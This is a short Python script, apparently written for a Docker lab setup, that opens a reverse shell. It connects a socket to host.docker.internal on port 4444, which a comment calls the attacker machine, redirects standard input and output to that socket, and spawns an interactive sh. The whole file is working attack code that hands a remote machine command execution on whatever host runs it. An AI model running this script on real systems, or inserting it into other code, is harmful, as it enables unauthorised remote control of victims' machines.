import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
#public internet IP of attacker machine
#s.connect(("127.0.0.1",4444))
#docker for mac host.docker.internal
s.connect(("host.docker.internal", 4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty; pty.spawn("sh")